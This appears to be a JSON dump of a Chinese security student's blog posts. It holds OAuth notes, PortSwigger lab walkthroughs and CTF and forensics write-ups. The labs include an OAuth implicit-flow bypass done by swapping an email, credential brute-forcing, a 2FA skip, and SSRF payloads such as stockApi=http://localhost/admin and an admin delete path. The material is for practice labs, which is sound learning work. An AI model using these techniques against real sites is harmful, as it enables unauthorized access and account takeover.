[{"title":"js调试","url":"/2025/06/27/js调试/","content":"\njs调试的目的 ？\n\n有加解密数据 需要我们去解密\n","tags":["-js"]},{"title":"恶臭h1php0q望周知","url":"/2025/06/20/恶臭h1php0q望周知/","content":"\n![image-20250620095958480](http://images.lwwww.top/images/20250620100030293.png)\n","tags":["-来看个笑话"]},{"title":"Oauth认证","url":"/2025/06/17/Oauth认证/","content":"\n#### 前言\n\n一开始六月初学了一次Oauth，然后没学明白，什么什么code session的讲的好乱 看了几个文章其实很清楚 但是他们的字拼凑在一起就特别难以理解 包括后来看的burp靶场里面有一个Oauth的讲解，也是捋不清楚一直到昨天网上听北山团队的陈广师傅讲了一遍前端Oauth，才缓慢反应过来。\n\nOAuth是一个在不提供用户名和密码的情况下，授权第三方应用访问web资源的安全协议 OAuth本身而言是一套很严谨的结构。\n\n先把我认为的好文章分享一下放到这里\n\n[阮一峰的理解Oauth](https://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html)\n\n[OAuth2.0入门（一）—— 基本概念详解和图文并茂讲解四种授权类型](https://blog.csdn.net/qq_37771475/article/details/103288957?fromshare=blogdetail&sharetype=blogdetail&sharerId=103288957&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\n\n[Burpsuite靶场之OAuth2.0漏洞及利用初探](https://blog.csdn.net/qq_28092985/article/details/121460422?fromshare=blogdetail&sharetype=blogdetail&sharerId=121460422&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\n\n一说起来Oauth可能不熟悉很陌生那么直接上截图就认识了\n\n![image-20250617154810712](http://images.lwwww.top/images/20250617154820197.png)\n\n![image-20250617154904480](http://images.lwwww.top/images/20250617154906720.png)\n\n\n\n现在就应该很熟悉了 随处可见 的oauth 那么再来理解一下定义就很清晰了\n\n```\nOAuth 是一种常用的授权框架，它使网站和 Web 应用程序能够请求对另一个应用程序上的用户帐户进行有限访问。\n```\n\n## 简单介绍 Oauth2.0 原理\n\n有两家互联网企业 A 和 B，其中 B 是一家提供相片云存储的公司。用户可以把相片上传到 B 网站上长期保存，然后可以在不同的设备上查看。某一天，A 和 B 谈成了一项合作：希望用户在使用 A 网站时，也可以观看他在 B 的相片。这个技术上要怎么实现呢？\n\n　　选项一：由 B 提供一个接口：\n\n \n\n　　GET /photos?account=\n\n　　参数：\n\n　　　　account ： B 账号\n\n　　返回：\n\n　　　　指定账号下的所有相片\n\n \n\n　　有了这个接口，A 网站只需在界面上显示一个输入框，让用户输入他的 B 账号，然后调用这个接口来获取相片就可以了。\n\n　　这样可行吗？\n\n回答当然是\n\nNO！为啥？\n\n　　因为实现并开放这样一个接口，相当于直接把 B 公司的相片资源全部暴露在互联网中，虽然并没有公开，但是对于有点安全意识的技术人员来说，要发现这个接口简直轻而易举。这样的话，B 的用户就没有任何隐私了。\n\n　　那怎么办呢？这样吧，为了保证不能随便获取别人的相片，我们把接口改成这样：\n\n　　`GET /photos?account=&pwd=`\n\n　　除了要求用户输入账号，还要输入密码。只有当账号密码验证通过，才返回该账号下的所有相片。这样，即使黑客发现了这个接口，他不知道用户的密码，所以没办法窃取用户的相片了。这样 OK 了吧？\n\n　　答案还是 NO！绝不可以这么做！\n\n　　为什么？这里涉及到一个信任问题。如果这样实现，那么，用户必须在 A 的网站里输入他在 B  的账号和密码。如果你是一个隐私意识很强的人，你很可能会问：“凭什么我要把 B 的账号密码告诉 A  ？”这里，从用户的角度就已经感受到一种不安全感，凭什么让我信任你 A，你保证不拿我的 B 账号密码去干坏事？而更深一层次，站在 B  的角度来考虑的话，也是一样的问题：我凭什么绝对信任 A？如果 A 在接收到用户的输入之后，马上就把请求发到我们这里来，那是 ok 的。但是万一 A 在这个过程偷偷把账号密码存起来了呢？那随着时间的推移，A 就慢慢地搜集到一大批 B 的账号密码！这对 B 来讲，是不能接受的！\n\n　　那怎么办呢？\n\n　　我们分析一下这个问题产生的原因，主要是在于 A、B、用户 三方的交互模型有问题。请看：\n\n![image-20250618154857960](http://images.lwwww.top/images/20250618154906518.png)\n\n\n\n在这个场景下，用户需要访问他在 B 的相片资源，但是他不能直接和 B 打交道，而是必须通过 A。在这个前提下去考虑问题，无论如何无法想出一个既能实现功能，又能让用户和 B 都感到放心的实现方案。\n\n　　Oauth2.0 就是为了解决这个问题而提出来的交互模型。它告诉人们，在这种场景下，三方要怎么打交道，才能做到安全、合理。\n\n　　具体来说，Oauth2.0 的交互模型的核心是这个样子的：\n\n![419544-20200309133048748-1286812626](http://images.lwwww.top/images/20250618154947282.png)\n\n　解释一下几个术语。\n\n　　资源服务器。即资源的存放地点，或者说资源的访问入口。在例子中，资源服务器即 get photos 接口所部署的服务器。A 必须经由这里去访问资源。\n\n　　鉴权服务器。这是一个对用户的身份进行认证、并对 A 进行授权的地方。这也是 Oauth2.0 的关键节点。通常情况下，鉴权服务器也是属于 B 公司的。\n\n \n\n　　好，接下来看看整个交互过程是怎样的。\n\n　　首先，同样是用户在访问 A 的网站，然后，A 需要访问 B 用户的相片。这个时候，A 并不是展示一个输入框给用户，而是打开一个页面。这个页面就是 B 部署在鉴权服务器上面的一个鉴权页面，通常情况下，它长得类似下面这个样子：![222134572926598](http://images.lwwww.top/images/20250618155039011.jpg)\n\n上面这个是腾讯给有道云笔记进行授权的页面。这里，腾讯就是 B，有道云笔记就是 A。（这页面是不是很熟悉？在哪见过？有兴趣了解一下账号接出的原理，其实就是Oauth2.0。）\n\n　　这个页面有两个要素：\n\n　　1，有认证机制。在腾讯这个例子中，你需要输入QQ账号密码，证明你是一个合法的QQ用户\n\n　　2，展示了授权信息。看页面右方“有道云笔记将获得以下权限”部分。这是在告诉用户，如果你授权给 A，那么，A 将获得访问你这些资源的权限\n\n　　注意，这个页面是部署在 B 的鉴权服务器上，所有用户输入的账号密码是直接提交给 B，A 是没有任何机会拿到的。\n\n　　如果用户同意授权并且认证通过，那么，接下来鉴权服务器会通知 A，并给 A 发送一个访问令牌（access token，其实就是一段全局唯一的随机字符串）。有了这个访问令牌，A 就可以拿着它去找资源服务器要资源了。\n\n　　所以，获取相片的接口会是类似这个形式（实际当中不会把 access token 放在 query string 中，这里做了简化）：\n\n \n\n　　GET /photos?accesstoken=\n\n \n\n　　资源服务器在接收到这个请求之后，会拿着 access token，再去找鉴权服务器，检查这个 access token 的合法性和权限，如果通过的话，才返回资源给 A。\n\n \n\n　　如此，即实现了功能，也保障了安全性。不过你可能会问，这个 access token 和账号密码的区别是什么呢？都是代表用户身份的，为什么 access token 就更安全？答案是：\n\n　　1，账号密码是一切，有了账号密码就几乎可以做任何事情（甚至改掉原密码）。而 access token 是有限制范围的。每个 access token 都有一个 scope，也就是允许执行哪些操作。\n\n　　2，access token 是有有效期的。如果 access token 被窃取，也不能一直用。\n\n### Authorization Code 授权原理和实现方法\n\nOauth2.0 定义了几种授权流程，其中最重要、也最基础的是 Authorization Code 授权。也就是授权码类型先看流程图：\n\n#### 授权码类型\n\n![419544-20210609172848603-384012851](D:/lwwblog/source/images/202502/419544-20210609172848603-384012851.png)\n\n1，用户访问 A 网站\n\n　　2，A 打开 B 的授权页面\n\n　　3，用户看到授权界面，输入账号密码进行授权\n\n　　4，B 验证用户是合法的之后，生成一个 authorization code，然后通过 302 跳转的方式，把这个 code 发送给 A\n\n　　5，A 用这个 code 调用 B 的 api，获得 access token\n\n　　6，A 用 access token 访问资源\n\n \n\n　　问题来了，**authorization code 是什么？**\n\n　　- code 一个一次性的临时凭证，可以用它来兑换 access token\n\n　　- code 是由鉴权服务器生成的一个随机且唯一的字符串\n\n　　- 鉴权服务器会记录下 code 的生成时间、将要兑换给谁（例子里是 A）、授权的用户是谁\n\n　　- 在第 5 步，鉴权服务器会验证 A 的身份，并且检查 code 的有效期。通过的话就会生成 access token\n\n　　- code 是一次性的，在第 5 步成功换取 access token 之后就会作废\n\n　　- code 的有效期非常短，可能不会超过 1 分钟。A 在第 4 步获取到 code 之后，要立刻走第 5 步\n\n **当然这些情况并不是绝对的这也是为什么把他们单拿出来强调**\n\n　　为什么不在第 4 步直接把 access token 发送给 A，而要通过看似多余的 code 再转换一下，搞这么复杂呢？这个问题的答案非常重要，是整个授权流程的关键所在。\n\n　　如果在第 4 步直接把 access token 发送给 A，会有什么问题呢？\n\n　　问题就是，第 4 步是一个 302 跳转，如果在第 4 步传递 access token，会导致 access token 暴露在 url 中，这是非常不安全的方式，因为 url 很容易捕捉到。\n\n \n\n　　所以我们不能在第 4 步直接传递 access token。那换成一个 code，再用 code 去换，就更安全了吗？你可以能会问，code 同样会泄漏，那攻击者拿到 code，也可以用 code 去换 access token，有什么区别呢？\n\n　　区别在于，攻击者拿到 code 是不能拿去换 access token 的，两个原因：\n\n　　1，上面说了，换取 access token 的时候，鉴权服务器会验证 A 的身份。具体怎么验证，在后面说明。\n\n　　2，code 的有效期极短，留给攻击者的时间极短\n\n　　另外，即便攻击者成功突破了上面两个限制，拿到了 access token，鉴权服务器也能很快发现。这是因为，攻击者必须抢在 A  之前去兑换 access token。那么，等到 A 走第 5 步的时候，鉴权服务器就会发现，这个 code  已经被用过了。此时这就是一个攻击已经发生的信号：有两个不同的服务器，尝试用同一个 code 来兑换 access  token，正常情况下是不应该发生的。此时鉴权服务器可以立刻采取措施。例如，可以把刚才兑换出去的 access token  作废。所以，搞出来一个 code，确实会安全很多。\n\n \n\n　　那么，怎么验证 A 的身份呢？\n\n \n\n　　所有的 A，应该说都是 B 的合作方。那么在开始合作之前，一定需要做一些前期的准备。具体来说，B 通常会提供一个申请网站，A  通过这个网站填写一些信息，提交合作申请。B 的工作人员会审核，通过之后，系统会给 A 自动分配一个 client_id 和一个  client_secret。client_id 就是一个唯一 id，client_secret 是一个密钥。A 需要把  client_secret 妥善保管在服务器上，不能泄露。在用 code 兑换 access token 的时候，需要用这个  client_secret 对请求生成 MAC（消息验证码）。鉴权服务器就是依靠这个 MAC 来验证 A 的身份的。\n\n　　这里需要用到密码学的知识，本文就不展开解释了，有兴趣请看 [什么是消息验证码MAC](https://www.cnblogs.com/blowing00/p/14872305.html) 。总之，攻击者因为没有这个密钥，无法对请求做出 MAC，因此就算窃取到 code，也不能用 code 来兑换 access token。\n\n \n\n　　根据上面的梳理，可以知道，要实现一套 Authorization Code 授权流程，需要做两个 endpoint：\n\n　　\n\n　　1，Auth Endpoint： GET /oauth2/auth　　这就是第 2 步的授权页面地址\n\n　　参数：\n\n　　　　client_id 发起授权的合作方的 client_id。必填\n\n　　　　redirect_uri 回调地址，也就是第 4 步 302 跳转的地址，用于接收 code。这个参数是可选的。因为在前期发起合作申请的时候，A 是需要提前将这个地址注册给 B 的。如果没有传，则使用注册的默认值\n\n　　　　**scope 授权范围**。这个也是可选的。B 可以把资源进行划分，分成多个 scope。A 发起授权的时候，可以指明要哪些 scope 的访问权限\n\n　　　　state 一个由 A 生成的，随机且唯一的字符串。这个是用来防 CSRF 攻击的\n\n\n\n![image-20250617173642261](http://images.lwwww.top/images/20250617173643461.png)\n\n```\n当用户访问资源时，比如在网易云音乐中使用第三方登录功能，例如QQ登录，那么这里的资源就是用户的QQ昵称和头像等信息。此时第三方应用（网易云音乐）将发送请求到授权服务器（QQ）去获取授权，此时授权服务器（QQ）将返回一个界面给用户，用户需要登录到QQ，并同意授权网易云音乐获得某些信息（资源）。当用户同意授权后，授权服务器将返回一个授权码（Authorization Code）\n给第三方应用，此时第三方应用在通过client_id、client_secret（这是需要第三方应用在授权服务器去申请的）和授权码去获得Access Token和Refresh Token，此时授权码将失效。然后就是第三方应用通过Access Token去资源服务器请求资源了，资源服务器校验Access Token成功后将返回资源给第三方应用。\n 这个是我点击qq登录后推送的页面 \n graph.qq.com/oauth2.0/show?which=Login&display=pc&client_id=100312028&response_type=code&redirect_uri=https%3A%2F%2Fpassport.baidu.com%2Fphoenix%2Faccount%2Fafterauth%3Fmkey%3D95a67454940271d50cfcde5e933cbe5921cd3c0297e652c6dc%26tpl%3Dmn&state=1750154092&display=page&scope=get_user_info%2Cadd_share%2Cget_other_info%2Cget_fanslist%2Cget_idollist%2Cadd_idol%2Cget_simple_userinfo&traceid=\n```\n\n```\ngraph.qq.com/oauth2.0/show?which=Login&display=pc&**client_id=100312028**&response_type=code&redirect_uri=https://passport.baidu.com/phoenix/account/afterauth?mkey=95a67454940271d50cfcde5e933cbe5921cd3c0297e652c6dc&tpl=mn&state=1750154092&display=page&scope=get_user_info,add_share,get_other_info,get_fanslist,get_idollist,add_idol,get_simple_userinfo&traceid=\n```\n\nclient_id对应出来了第一步，但是由于我们还没有登录到qq的oauth认证的板块也就是看到的graph.qq.com的域名 所以不能进行下一步--**确认授权**\n\n![image-20250617175254292](http://images.lwwww.top/images/20250617175256563.png)\n\n\n\n\n\n\n\n![image-20250617181704970](http://images.lwwww.top/images/20250617181706444.png)\n\n```\nPOST /speed?id=RiaWqsnT3403yXTgVY&uin=5e637f0000012299-097977a4fd7a8afa-9020&version=9fce2a54&aid=f61ac0fc-29e6-4a54-ba88-1410ed52a180&env=production&platform=3&netType=100&vp=407 * 331&sr=1920 * 1080&sessionId=session-1750155370383&from=https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=716027609&daid=383&style=33&login_text=登录&hide_title_bar=1&hide_border=1&target=self&s_url=https://graph.qq.com/oauth2.0/login_jump&pt_3rd_aid=100312028&pt_feedback_link=https://support.qq.com/products/77942?customInfo=www.baidu.com.appid100312028&theme=2&verify_theme=&referer=https://graph.qq.com/\n```\n\n![image-20250619105901364](http://images.lwwww.top/images/20250619105910537.png)\n\n然后回包是这样的\n\n```\nresponse_type=code&client_id=100312028&redirect_uri=https://passport.baidu.com/phoenix/account/afterauth?mkey=188101cf26a4c3a6ce7bcd20322fe5c6e1506adeb783209b76&tpl=mn&scope=get_user_info,add_share,get_other_info,get_fanslist,get_idollist,add_idol,get_simple_userinfo&state=1750300730&switch=&from_ptlogin=1&src=1&update_auth=1&openapi=1010&g_tk=1573676930&auth_time=1750300769539&ui=A78DC9BA-5CF3-4B9D-A2A2-6A998F4002C4\n```\n\n![284b219931d0254f822b2d139a13898](http://images.lwwww.top/images/20250619110425261.png)\n\n\n\n### BP靶场打一下——隐式\n\n```\nhttps://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow\n```\n\n![image-20250624103923012](http://images.lwwww.top/images/20250624103932086.png)\n\n![image-20250624104007440](http://images.lwwww.top/images/20250624104009581.png)\n\n\n\n这个地方一开始没理解好 想着怎么一登录就变成了Oauth啊 后来过来两天才反应过来这直接就是一个Oauth的接口也就是直接就是微信登录....\n\n服了\n\n![image-20250624104157535](http://images.lwwww.top/images/20250624104159088.png)\n\n输入账密以后是对B/鉴权服务器的一个登录 然后这个页面是对A也就是要授权/使用的网站的一个授权\n\n他要我b上面得profile和email\n\n```\nGET /auth?client_id=a4jt0cmw0ft69srfmpds7&redirect_uri=https://0a62002b03684beb82827a9e00cf0082.web-security-academy.net/oauth-callback&response_type=token&nonce=-847450422&scope=openid%20profile%20email HTTP/2\nHost: oauth-0a3300ad03c84b7782bc789802780049.oauth-server.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a62002b03684beb82827a9e00cf0082.web-security-academy.net/\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: cross-site\nPriority: u=0, i\nTe: trailers\nConnection: keep-alive\n\n\n```\n\n翻数据包，看到/authenticate路径下就是我们认证的校验值，需要特别注意的就是我们的这个token值，也就是我画的那张图片，这里就直接校验token值，我们直接把email进行替换，然后再放包发包操作\n\n![image-20250624113013205](http://images.lwwww.top/images/20250624113017469.png)\n\n![image-20250624113336546](http://images.lwwww.top/images/20250624113338786.png)\n\n唉唉怎么解决啦好厉害\n","tags":["-web -oauth -src"]},{"title":"SRC学习——CSRF","url":"/2025/06/09/SRC学习——CSRF/","tags":["-web -src -csrf"]},{"title":"CDN绕过-查找真实IP","url":"/2025/06/09/CDN绕过-查找真实IP/"},{"title":"BP靶场之api","url":"/2025/05/26/BP靶场之api/","content":"\n- `GET`- 从资源检索数据。\n\n- `PATCH`- 对资源应用部分更改。\n\n- `OPTIONS`- 检索有关资源上可以使用的请求方法的类型的信息。\n\n  \n\n  API 端点可能支持不同的 HTTP 方法。因此,在研究 API 端点时测试所有潜在方法非常重要。这可能使您能够识别额外的端点功能,打开更多攻击面。  例如,端点/api/tasks可以支持以下方法:  • GET /api/tasks- 检索任务列表。 • POST /api/tasks创建一个新任务。 • DELETE /api/tasks/1删除一个任务。  您可以使用 Burp Intruder 中内置的 HTTP 动词列表自动循环通过一系列方法。 \n\n  \n\n​    API 端点通常期望以特定格式提供数据。因此,它们的行为可能有所不同,具体取决于请求中提供的数据的内容类型。更改内容类型可能使您能够:\n\n- 触发错误,披露有用信息。\n- 绕过有缺陷的防御。\n- 利用处理逻辑的差异。例如,API在处理JSON数据时可能是安全的,但在处理XML时容易受到注入攻击。\n\n​    要更改内容类型,请修改`Content-Type`header,然后相应地重新格式化请求体。您可以使用内容类型转换器 BApp 自动转换 XML 和 JSON 之间请求中提交的数据。\n","tags":["-web -bp -靶场 -渗透"]},{"title":"BP靶场之身份认证漏洞","url":"/2025/05/22/BP靶场之身份认证漏洞/","content":"\n### 身份验证漏洞 \n\n从概念上讲,身份验证漏洞很容易理解。然而,由于身份验证与安全之间的明确关系,它们通常至关重要。  身份验证漏洞可以让攻击者访问敏感数据和功能。它们还暴露了额外的攻击面,以便进一步利用。因此,了解如何识别和利用身份验证漏洞以及如何绕过常见的保护措施非常重要。\n\n![password-reset-poisoning](http://images.lwwww.top/images/20250522210059037.svg)\n\n\n\n```\n认证和授权的区别：\n\t身份验证是验证用户是否是他们声称是谁的过程。\n\t授权涉及验证用户是否被允许做某事。\n```\n\n#### Lab: Username enumeration via different responses\n\n![image-20250522214543481](http://images.lwwww.top/images/20250522214546197.png)\n\n进行一个爆破\n\n用户名和密码的列表已经给出\n\n一开始的思路是，集群炸弹直接梭哈\n\n但是wp是狙击手去遍历，这里我就直接梭哈了\n\n![image-20250522231415234](http://images.lwwww.top/images/20250522231417554.png)\n\n筛选长度 这个就是密码了\n\n直接登录进去就欧克了\n\n### 绕过双因素身份验证\n\n​            有时,双因素身份验证的实现存在缺陷,以至于可以完全绕过它。        \n\n​             如果用户首先被提示输入密码,然后提示在单独的页面上输入验证码,则用户在输入验证码之前实际上处于“登录”状态。在这种情况下,值得测试的是,在完成第一个身份验证步骤后,是否可以直接跳到“仅登录”页面。偶尔,你会发现一个网站实际上并没有在加载页面之前检查你是否完成了第二步。        \n\n\n\n#### Lab: 2FA simple bypass\n\n![image-20250523001507819](http://images.lwwww.top/images/20250524133630462.png)\n\n先用题目给的账号登录进去然后会自动发送邮件 这个时候你去退出/返回页面的时候 再进去账户就已经是登录的状态了 也就是说验证码其实没有用到 只是发送了 \n\n那么依据这个情况 可以直接访问carlos的账户 登录然后直接进入账户页面即可\n\n![image-20250523121158175](http://images.lwwww.top/images/20250523121208589.png)\n\n### SSRF\n\n​            服务器端请求伪造是一个Web安全漏洞,允许攻击者导致服务器端应用程序向意外位置发出请求。        \n\n​            在典型的 SSRF 攻击中,攻击者可能导致服务器连接到组织基础架构内的内部服务。在其他情况下,它们可能能够强制服务器连接到任意外部系统。这可能会泄露敏感数据,例如授权凭据。        \n\n##### 对服务器的 SSRF 攻击\n\n​            在针对服务器的 SSRF 攻击中,攻击者通过其环回网络接口,使应用程序向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供一个包含主机名的URL,例如`127.0.0.1`(指向环回适配器的保留 IP 地址)或`localhost`(同一适配器常用的名称)。        \n\n​            例如,想象一个购物应用程序,让用户查看特定商店中是否有库存的物品。要提供库存信息,应用程序必须查询各种后端 REST  API。它通过前端HTTP请求将URL传递给相关的后端API端点来做到这一点。当用户查看某个项目的库存状态时,其浏览器会提出以下请求:     \n\n   \n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3Fp\nroductId%3D6%26storeId%3D1\n```\n\n​            这导致服务器向指定的URL发出请求,检索库存状态,并将其返回给用户。        \n\n​            在本例中,攻击者可以修改请求以指定服务器本地的 URL:        \n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n```\n\n​            服务器获取内容`/admin`URL 并返回给用户。        \n\n​            攻击者可以访问`/admin`URL,但管理功能通常只对经过身份验证的用户访问。这意味着攻击者不会看到任何感兴趣的东西。但是,如果请求`/admin`URL来自本地机器,正常的访问控制被绕过。应用程序授予对管理功能的完全访问权限,因为该请求似乎来自受信任的位置。     \n\n#### Lab: Basic SSRF against the local server   \n\n实验室商品有一个查看库存 有一个api接口\n\n![image-20250524132108061](http://images.lwwww.top/images/20250524132117956.png)是通过这一个地方去进行一个调用\n\n正常的管理员页面是/admin\n\n我们是访问不到的 \n\n![](http://images.lwwww.top/images/20250524132944426.png\n\n然后修改一下api去调用的传参 访问 `http://localhost/admin`\n\n![image-20250524133251968](http://images.lwwww.top/images/20250524133623188.png)\n\n然后我们访问到这个页面看一下 找到删除的链接 \n\n![image-20250524133434159](http://images.lwwww.top/images/20250524133620747.png)\n\n\n\n![image-20250524133421303](http://images.lwwww.top/images/20250524133618115.png)\n\n\n\n`/admin/delete?username=carlos`\n\n然后就很显而易见了 直接整一个payload就是\n\n![image-20250524133548188](http://images.lwwww.top/images/20250524133612755.png)\n\n\n\n解决\n\n#### Lab: Basic SSRF against another back-end system\n\n这个和前面一样 只不过不是固定的localhost和127.0.0.1了 变成内网的某个地址了 多了一步探测内网的步骤\n\n剩下的没啥好记录的了-~~还是懒，嗯就先到这了~~\n","tags":["-渗透 -web -bp -靶场"]},{"title":"软件安全赛复现","url":"/2025/03/24/软件安全赛复现/","content":"\n坐牢没解出\n\n但是赛后看wp思路几乎一致 只差一个5G的小知识点\n\n![image-20250324191942717](http://images.lwwww.top/images/20250324191952203.png)\n\n​\twireshark打开文件\n\n从头开始捋的话\n\n我的思路是\n\n```\n先看到协议 一眼望去都是tcp然后还有一个点是目的ip和源ip都是127.0.0.1----所以默认没用了 然后就看到ICMPv6有TLSv1.2\n```\n\n![image-20250324193307365](http://images.lwwww.top/images/20250324193309693.png)\n\n\n\n这个时候结合题目5G主题猜也知道关键点就是这个TLS的消息\n\n```\nTLS流量是指通过TLS协议加密的数据传输，它在客户端和服务器之间建立一个加密的通道，确保数据在传输过程中不被窃听、篡改或伪造。\n\n一般的TLS流量就是找到key，导入key，在导入key之后就会多出几个流量包（即加密流量包），在里边会有想要的答案。\n```\n\n![image-20250324201837766](http://images.lwwww.top/images/20250324201839705.png)\n\nmisc手的通病 就是工具梭哈试试 所以启动NetA\n\n![image-20250324201947704](http://images.lwwww.top/images/20250324201949767.png)\n\n在这里也是 找到了关键点 也就这个TLS.keylog\n\n但是当时在现场没有这个知识点 \n\n![image-20250324202847018](http://images.lwwww.top/images/20250324202850629.png)\n\n在NetA和wireshark里面都可以找到有这个TLS.keylog的文件的地方\n\n![image-20250324203915616](http://images.lwwww.top/images/20250324203917826.png)\n\n并且还能找到这个信息 Bob的一句话\n\n在追踪流SIP流能找到出处\n\n![image-20250324210003039](http://images.lwwww.top/images/20250324210006134.png)\n\n![image-20250324210040122](http://images.lwwww.top/images/20250324210042399.png)\n\n追踪完SIP流再看TCP流\n\n往下翻找![image-20250324211019039](http://images.lwwww.top/images/20250324211040128.png)\n\n![](http://images.lwwww.top/images/20250324211049316.png)\n\n![image-20250324211108854](http://images.lwwww.top/images/20250324211111045.png)\n\n![image-20250324211123567](http://images.lwwww.top/images/20250324211125199.png)\n\n```\nSERVER HANDSHAKE TRAFFIC SECRET\n9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795EXPORTER SECRET\n9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c131882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cfobfe18f0b0\nSERVER_TRAFFIC_SECRET_0\n9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c11fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92d\nc75633bdcf43630\nCLIENT_HANDSHAKE TRAFFIC SECRET9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0\nCLIENT_TRAFFIC SECRET O9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n```\n\n把散落的组成并保存成ssl.log\n\n![image-20250324212358786](http://images.lwwww.top/images/20250324212400851.png)\n\n导入：编辑-->首选项-->Protocols-->TLS\n\n但是遇到了一个问题就是keylog的格式其实有要求的 我自己调试了很多次然后问了C3师傅才成功导入进去正确的格式\n\n```\nSERVER_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795\nEXPORTER_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 31882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cf0bfe18f0b0\nSERVER_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 1fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92dc75633bdcf43630\nCLIENT_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0\nCLIENT_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n```\n\n~~把这个保存为后缀为log的文件就可以 这个格式正确~~\n\n![1742879091881](http://images.lwwww.top/images/20250325130509681.png)\n\n![image-20250325132155186](http://images.lwwww.top/images/20250325132157678.png)\n\n最后的步骤就很简单了 \n\n图片出来就是flag了\n\n","tags":["-WP -MISC -CTF"]},{"title":"FIC取证初赛复现","url":"/2025/03/18/FIC取证初赛复现/","content":"\ny\n\n一上来就遇到问题了 想要复现取证的题目一定要准备一个大硬盘 保守估计500G+ 才能够用然后需要一个百兆的网络和百度网盘的会员 （你怎么知道我给学校校园网破了现在是千兆网 只不过百度网盘限速到百兆） 趁着刚打完痛苦的ciscn暨长城杯之后我决心继续猛猛学习~~主要是手里面还有弘连的火眼想爽一把取证梭哈的感觉不是~~\n\n第一步就是这个该死的挂载 一开始懵懵的不知道是啥文件还傻乎乎问C3 C3说用file查一下 我电脑还没装wsl（有空一定装备）然后想起来vc了就胡乱搞结果还真是vc直接挂载了好神奇\n\n![image-20250318000657244](http://images.lwwww.top/images/20250318000708033.png)![image-20250318000856181](http://images.lwwww.top/images/20250318000904026.png)\n\n然后就是熟悉的镜像文件了\n\n![image-20250318000941826](http://images.lwwww.top/images/20250318000943579.png)\n\n## 手机检材\n\n#### 题目描述\n\n2024年4月，卢某报案至警方，声称自己疑似遭受了“杀猪盘”诈骗，大量钱财被骗走。卢某透露，在与某公司交流过程中结识了员工李某。李某私下诱导卢某参与赌博游戏，起初资金出入均属正常。但随后，李某称赌博平台为提升安全性，更换了地址和玩法，转为通过群聊抢红包形式进行赌博。随着赌资不断增加，卢某投入巨额资金后，发现无法再访问该网站，同时李某也失去联系，卢某遂意识到自己被骗。\n 在经济压力下，卢某选择报警，并承认参与赌博活动，愿意承担相应法律后果。警方依据卢某提供的线索和手机数据，迅速锁定犯罪团伙，并在一藏匿地点成功抓获犯罪嫌疑人李某和赵某。警方对嫌疑人持有的物品进行了证据固定：李某手机被标记为检材1，窝点内服务器为检材2，赵某使用的计算机为检材3。\n 接下来，请取证工作者根据案情和这些检材进行深入分析，并解答后续问题。\n\n#### 手机部分1\n\n嫌疑人李某的手机型号是？\n\n- [ ] A. Xiaomi MI 2s\n\n- [x] B. Xiaomi MI 4\n\n- [ ] C. Xiaomi MI 6\n\n- [ ] D. Xiaomi MI 8\n\n\n![image-20250320122855362](http://images.lwwww.top/images/20250320123252241.png)\n\n思路是型号肯定在很多配置文件里面存在 存在的情况下我们全局里面搜索看看有没有泄露出来的 很顺利在文件内容里面就搜索出来了\n\n不过我一开始是在文件里面看 发现找不到 \n\n#### 手机部分2\n\n嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？\n\n- [ ] A. iPad Pro 11\n\n- [ ] B. Vivo Pad 2\n\n- [ ] C. MatePad Pro\n\n- [x] D. Xiaomi Pad 6s\n\n  ![image-20250320123244673](http://images.lwwww.top/images/20250320123256168.png)\n\n  